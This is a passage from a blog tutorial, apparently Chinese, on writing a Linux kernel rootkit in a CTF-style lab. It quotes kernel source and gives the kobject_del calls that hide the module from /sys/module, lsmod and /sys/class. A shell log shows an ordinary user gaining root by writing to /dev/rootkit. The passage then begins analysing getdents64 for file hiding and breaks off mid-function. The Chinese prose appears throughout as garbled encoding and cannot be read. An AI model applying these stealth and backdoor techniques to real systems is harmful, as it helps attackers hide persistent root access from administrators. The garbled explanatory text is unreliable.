class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">entry</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span>*<span class="title">parent</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kset</span>*<span class="title">kset</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobj_type</span>*<span class="title">ktype</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernfs_node</span>*<span class="title">sd</span>;</span> <span class="comment">/* sysfs directory entry */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kref</span><span class="title">kref</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> state_initialized:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> state_in_sysfs:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> state_add_uevent_sent:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> state_remove_uevent_sent:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> uevent_suppress:<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_KOBJECT_RELEASE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">delayed_work</span><span class="title">release</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯åŒæ ·æ˜¯å­˜åœ¨ä¸€ä¸ªæˆå‘˜<code>entry</code>æ˜¯<code>list_head</code>ç»“æ„çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __kobject_del(struct kobject *kobj)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernfs_node</span> *<span class="title">sd</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobj_type</span> *<span class="title">ktype</span>;</span></span><br><span class="line"></span><br><span class="line">sd = kobj-&gt;sd;</span><br><span class="line">ktype = get_ktype(kobj);</span><br><span class="line"></span><br><span class="line">sysfs_remove_groups(kobj, ktype-&gt;default_groups);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* send &quot;remove&quot; if the caller did not do it but sent &quot;add&quot; */</span></span><br><span class="line"><span class="keyword">if</span> (kobj-&gt;state_add_uevent_sent &amp;&amp; !kobj-&gt;state_remove_uevent_sent) &#123;</span><br><span class="line">pr_debug(<span class="string">&quot;&#x27;%s&#x27; (%p): auto cleanup &#x27;remove&#x27; event\n&quot;</span>,</span><br><span class="line"> kobject_name(kobj), kobj);</span><br><span class="line">kobject_uevent(kobj, KOBJ_REMOVE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sysfs_remove_dir(kobj);</span><br><span class="line">sysfs_put(sd);</span><br><span class="line"></span><br><span class="line">kobj-&gt;state_in_sysfs = <span class="number">0</span>;</span><br><span class="line">kobj_kset_leave(kobj);</span><br><span class="line">kobj-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kobject_del</span><span class="params">(struct kobject *kobj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">parent</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!kobj)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">parent = kobj-&gt;parent;</span><br><span class="line">__kobject_del(kobj);</span><br><span class="line">kobject_put(parent);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kobject_del);</span><br></pre></td></tr></table></figure><p>è™½ç„¶å½¢å¼åŒå‰é¢ä¸€è‡´ï¼Œä¸è¿‡è¿™æ˜¯å´æ˜¯ç›´æ¥åœ¨<code>__kobject_del</code>å‡½æ•°ä¸­ä½¿ç”¨äº†<code>sysfs_remove_dir</code>æ¥åˆ é™¤æ–‡ä»¶å¤¹ï¼Œå…¶å†…éƒ¨å®ç°å°±æ˜¯åˆ é™¤æ‰å½“å‰<code>kobject</code>ç»“æ„ä½“çš„sdæŒ‡é’ˆï¼ˆå³super blockï¼‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobject_del(&amp;__this_module.mkobj.kobj);</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢çš„å«ä¹‰æ¥è¯´æˆ‘ä»¬åªéœ€è°ƒç”¨è¿™ä¸€ä¸ª<code>kobject_del</code>å‡½æ•°å³å¯å®ç°<code>/sys/module/</code>ä¿¡æ¯éšè—äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~ $ ls /sys/module/ | grep rootfs</span><br><span class="line">~ $ lsmod</span><br><span class="line">~ $ cat /proc/modules | grep rookit</span><br><span class="line">~ $ ls /sys/module/ | grep rootkit</span><br><span class="line">~ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">~ $ <span class="built_in">echo</span> a &gt; /dev/rootkit </span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="sys-class-ä¿¡æ¯éšè—"><a href="#sys-class-ä¿¡æ¯éšè—" class="headerlink" title="/sys/class/ä¿¡æ¯éšè—"></a>/sys/class/ä¿¡æ¯éšè—</h3><p>æˆ‘ä»¬åœ¨åˆ›å»º <code>/dev/</code> è®¾å¤‡æ–‡ä»¶æ¥å£æ—¶åˆ›å»ºäº†ä¸€ä¸ª classï¼Œè€Œè¿™å¯ä»¥è¢«åœ¨ <code>/sys/class</code> ç›®å½•ä¸‹å‘ç°ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦å®Œæˆå¯¹ class çš„éšè—ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">~ $ ls /sys/class/</span><br><span class="line">ata_device     dma_heap       mdio_bus       ptp            spi_slave</span><br><span class="line">ata_link       dmi            mem            pwm            thermal</span><br><span class="line">ata_port       extcon         misc           rapidio_port   tpm</span><br><span class="line">backlight      firmware       mmc_host       regulator      tpmrm</span><br><span class="line">bdi            gpio           nd             remoteproc     tty</span><br><span class="line">block          graphics       net            rfkill         usb_role</span><br><span class="line">bsg            hwmon          pci_bus        rootkit_class  vc</span><br><span class="line">dax            i2c-adapter    pci_epc        rtc            vfio</span><br><span class="line">devcoredump    i2c-dev        phy            scsi_device    virtio-ports</span><br><span class="line">devfreq        input          power_supply   scsi_disk      vtconsole</span><br><span class="line">devfreq-event  intel_scu_ipc  powercap       scsi_generic   wakeup</span><br><span class="line">devlink        iommu          ppp            scsi_host      watchdog</span><br><span class="line">dma            leds           pps            spi_master</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kset_unregister</span><span class="params">(struct kset *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!k)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">kobject_del(&amp;k-&gt;kobj);</span><br><span class="line">kobject_put(&amp;k-&gt;kobj);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kset_unregister);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">class_unregister</span><span class="params">(struct class *cls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">pr_debug(<span class="string">&quot;device class &#x27;%s&#x27;: unregistering\n&quot;</span>, cls-&gt;name);</span><br><span class="line">class_remove_groups(cls, cls-&gt;class_groups);</span><br><span class="line">kset_unregister(&amp;cls-&gt;p-&gt;subsys);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">class_destroy</span><span class="params">(struct class *cls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((cls == <span class="literal">NULL</span>) || (IS_ERR(cls)))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">class_unregister(cls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç²—ç•¥çš„æŸ¥çœ‹ä¸€ä¸‹<code>class_destroy</code>çš„åŸºæœ¬æµç¨‹ä¼šå‘ç°å…¶æ˜¯é€šè¿‡<code>kobject_del</code>å‡½æ•°è¿›è¡Œåˆ é™¤çš„ï¼Œæ‰€ä»¥è¿™é‡Œå…¶å®å¯ä»¥å’Œ<code>/sys/module/</code>è¿›è¡Œéšè—æ—¶çš„æ“ä½œä¸€æ ·å³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobject_del(&amp;(((struct kset *)module_class-&gt;p)-&gt;kobj));</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ $ ls /sys/class/ | grep rootkit</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå®ç°éšè—ã€‚</p><h3 id="æ–‡ä»¶éšè—"><a href="#æ–‡ä»¶éšè—" class="headerlink" title="æ–‡ä»¶éšè—"></a>æ–‡ä»¶éšè—</h3><p>åœ¨å‰æ–‡ä¸­ï¼Œåœ¨åˆ›å»ºè®¾å¤‡åå¯ä»¥åœ¨<code>/dev</code>ç›®å½•ä¸­çœ‹åˆ°è®¾å¤‡ï¼Œå¹¶ä¸”æˆ‘ä»¬çš„rootkitéœ€è¦é•¿æœŸé©»ç•™åœ¨ç³»ç»Ÿä¸­ï¼Œå¦‚æœæƒ³æ¯ä¸€æ¬¡å¼€æœºéƒ½è‡ªåŠ¨è½½å…¥æˆ‘ä»¬çš„rootkitï¼Œè¿™ä¹Ÿå°±è¦æ±‚æˆ‘ä»¬çš„rootkitæ–‡ä»¶è¿˜éœ€è¦ä¿ç•™åœ¨ç³»ç»Ÿä¸­ã€‚æ‰€ä»¥æ¥ä¸‹æ¥éœ€è¦æˆ‘ä»¬è¿›è¡Œæ–‡ä»¶éšè—äº†ã€‚</p><p>åœ¨linuxä¸­æˆ‘ä»¬æœ€å¸¸ç”¨çš„ä¾¿åˆ©æ–‡ä»¶å¤¹çš„å‘½ä»¤æ˜¯<code>ls</code>ï¼Œè¿™é‡Œè¿½è¸ªä¸€ä¸‹<code>ls</code>æ‰€ä½¿ç”¨äº†ä»€ä¹ˆç³»ç»Ÿè°ƒç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;.&quot;</span>, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = <span class="number">3</span></span><br><span class="line">fstat(<span class="number">3</span>, &#123;st_mode=S_IFDIR|<span class="number">0755</span>, st_size=<span class="number">832</span>, ...&#125;) = <span class="number">0</span></span><br><span class="line">getdents64(<span class="number">3</span>, <span class="comment">/* 26 entries */</span>, <span class="number">32768</span>)  = <span class="number">904</span></span><br><span class="line">getdents64(<span class="number">3</span>, <span class="comment">/* 0 entries */</span>, <span class="number">32768</span>)   = <span class="number">0</span></span><br><span class="line">close(<span class="number">3</span>)                                = <span class="number">0</span></span><br><span class="line">fstat(<span class="number">1</span>, &#123;st_mode=S_IFCHR|<span class="number">0620</span>, st_rdev=makedev(<span class="number">0x88</span>, <span class="number">0</span>), ...&#125;) = <span class="number">0</span></span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;busybox-1.36.1\texp.c  linux-5.11&quot;</span>..., <span class="number">189b</span>usybox<span class="number">-1.36</span><span class="number">.1</span><span class="built_in">exp</span>.c  linux<span class="number">-5.11</span>  Makefile  modules.order  Module.symvers  rootfs  rootfs.cpio  rootkit.c  rootkit.korootkit.mod  rootkit.mod.c  rootkit.mod.o  rootkit.o  x</span><br><span class="line">) = <span class="number">189</span></span><br><span class="line">close(<span class="number">1</span>)                                = <span class="number">0</span></span><br><span class="line">close(<span class="number">2</span>)                                = <span class="number">0</span></span><br><span class="line">exit_group(<span class="number">0</span>)                           = ?</span><br><span class="line">+++ exited with <span class="number">0</span> +++</span><br></pre></td></tr></table></figure><p>å‰é¢å¤§å¤šæ˜¯glibcåº“çš„è®¸å¤šç³»ç»Ÿè°ƒç”¨æ¯”å¦‚åˆ›å»ºå†…å­˜ç­‰æ‰€ä»¥è¿™é‡Œçœç•¥äº†ï¼Œä»è¿™é‡Œå¼€å§‹ï¼Œèƒ½å¤Ÿæ³¨æ„åˆ°çš„æ˜¯è¿™é‡Œå­˜åœ¨<code>getdents64</code>è¿™æ ·ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(getdents64, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd,</span><br><span class="line">struct linux_dirent64 __user *, dirent, <span class="keyword">unsigned</span> <span class="keyword">int</span>, count)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">getdents_callback64</span> <span class="title">buf</span> =</span> &#123;</span><br><span class="line">.ctx.actor = filldir64,</span><br><span class="line">.count = count,</span><br><span class="line">.current_dir = dirent</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">f = fdget_pos(fd);</span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">error = iterate_dir(f.file, &amp;buf.ctx);</span><br><span class="line"><span class="keyword">if</span> (error &gt;= <span class="number">0</span>)</span><br><span class="line">error = buf.error;</span><br><span class="line"><span class="keyword">if</span> (buf.prev_reclen) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent64</span> __<span class="title">user</span> * <span class="title">lastdirent</span>;</span></span><br><span class="line">typeof(lastdirent-&gt;d_off) d_off = buf.ctx.pos;</span><br><span class="line"></span><br><span class="line">lastdirent = (<span class="keyword">void</span> __user *) buf.current_dir - buf.prev_reclen;</span><br><span class="line"><span class="keyword">if</span> (put_user(d_off, &amp;lastdirent-&gt;d_off))</span><br><span class="line">error = -EFAULT;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">error = count - buf.count;</span><br><span class="line">&#125;</span><br><span class="line">fdput_pos(f);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å†…æ ¸ä¸­æŸ¥çœ‹å…¶æºç å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œæ‰€ä»¥å‰é¢ä¼ å…¥çš„3å³<code>openat</code>å½“å‰ç›®å½•æ‰€å¾—åˆ°çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</p><p>å›åˆ°ä¸Šè¿°ä»£ç ï¼Œå…¶ä¸­çš„<code>fdget_pos</code>å‡½æ•°å’Œ<code>fdput_pos</code>å‡½æ•°å¯¹åº”çš„æ˜¯å¯¹æ–‡ä»¶æè¿°ç¬¦è¿›è¡ŒåŠ é”å’Œè§£é”çš„æ“ä½œï¼Œè¿™é‡Œä¸»è¦çš„å®ç°å‡½æ•°æ˜¯<code>iterate_dir</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">iterate_dir</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(file);</span><br><span class="line"><span class="keyword">bool</span> shared = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">int</span> res = -ENOTDIR;</span><br><span class="line"><span class="keyword">if</span> (file-&gt;f_op-&gt;iterate_shared)</span><br><span class="line">shared = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!file-&gt;f_op-&gt;iterate)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">res = security_file_permission(file, MAY_READ);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (shared)</span><br><span class="line">res = down_read_killable(&amp;inode-&gt;i_rwsem);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">res = down_write_killable(&amp;inode-&gt;i_rwsem);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">res = -ENOENT;</span><br><span class="line"><span class="keyword">if</span> (!IS_DEADDIR(inode)) &#123;</span><br><span class="line">ctx-&gt;pos = file-&gt;f_pos;</span><br><span class="line"><span class="keyword">if</span> (shared)</span><br><span class="line">res = file-&gt;f_op-&gt;iterate_shared(file, ctx);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">res = file-&gt;f_op-&gt;iterate(file, ctx);</span><br><span class="line">file-&gt;f_pos = ctx-&gt;pos;</span><br><span class="line">fsnotify_access(file);</span><br><span class="line">file_accessed(file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (shared)</span><br><span class="line">inode_unlock_shared(inode);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">inode_unlock(inode);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(iterate_dir)</span><br></pre></td></tr></table></figure><p>Linuxç³»ç»Ÿå¯ä»¥é€‚ç”¨äºä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿçš„åŸå› å°±æ˜¯ä¸­é—´å­˜åœ¨ä¸€å±‚VFSå±‚ï¼Œåœ¨å†…æ ¸ä¸­ä½¿ç”¨<code>file</code>ç»“æ„ä½“æ¥è¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œæ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€å¼ å‡½æ•°è¡¨ <code>file_operations</code> å‡½æ•°è¡¨å¯¹åº”ç›¸åº”çš„å¯¹è¯¥æ–‡ä»¶çš„ç›¸å…³æ“ä½œï¼ˆä¾‹å¦‚ readã€writeï¼‰ï¼Œè¯¥å‡½æ•°è¡¨å–è‡ªè¯¥æ–‡ä»¶å¯¹åº”çš„ inodeï¼Œæœ€ç»ˆå–è‡ªç›¸åº”çš„æ–‡ä»¶ç³»ç»Ÿæä¾›çš„å…·ä½“å‡½æ•°ï¼Œåœ¨è¿™é‡Œä¼šè°ƒç”¨è¡¨ä¸­çš„å‡½æ•°æŒ‡é’ˆ <code>iterate_shared</code> æˆ– <code>iterate</code>ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20240216143807039.png"                      alt="image-20240216143807039"                ></p><p>ä½¿ç”¨gdbç®€å•è°ƒè¯•å‘ç°Linux-5.10ç‰ˆæœ¬å†…æ ¸ä¼šè°ƒç”¨<code>interate_shared</code>å‡½æ•°ï¼Œç»§ç»­è°ƒè¯•ä¼šå‘ç°å…¶æœ€ç»ˆè°ƒç”¨<code>dcache_readdir</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dcache_readdir</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span> =</span> file-&gt;f_path.dentry;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">cursor</span> =</span> file-&gt;private_data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">anchor</span> =</span> &amp;dentry-&gt;d_subdirs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">next</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!dir_emit_dots(file, ctx))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;pos == <span class="number">2</span>)</span><br><span class="line">p = anchor;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!list_empty(&amp;cursor-&gt;d_child))</span><br><span class="line">p = &amp;cursor-&gt;d_child;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((next = scan_positives(cursor, p, <span class="number">1</span>, next)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!dir_emit(ctx, next-&gt;d_name.name, next-&gt;d_name.len,</span><br><span class="line">      d_inode(next)-&gt;i_ino, dt_type(d_inode(next))))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">ctx-&gt;pos++;</span><br><span class="line">p = &amp;next-&gt;d_child;</span><br><span class="line">&#125;</span><br><span class="line">spin_lock(&amp;dentry-&gt;d_lock);</span><br><span class="line"><span class="keyword">if</span> (next)</span><br><span class="line">list_move_tail(&amp;cursor-&gt;d_child, &amp;next-&gt;d_child);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">list_del_init(&amp;cursor-&gt;d_child);</span><br><span class="line">spin_unlock(&amp;dentry-&gt;d_lock);</span><br><span class="line">dput(next);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(dcache_readdir);</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨æ„åˆ°çš„æ˜¯å‡½æ•°å†…éƒ¨ä¼šé€šè¿‡<code>scan_positives</code>è¿›è¡Œéå†è·å¾—nextï¼Œæœ€åé€šè¿‡<code>dir_emit</code>æäº¤ç»™vfså±‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct dentry *<span class="title">scan_positives</span><span class="params">(struct dentry *cursor,</span></span></span><br><span class="line"><span class="params"><span class="function">struct list_head *p,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">loff_t</span> count,</span></span></span><br><span class="line"><span class="params"><span class="function">struct dentry *last)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span> =</span> 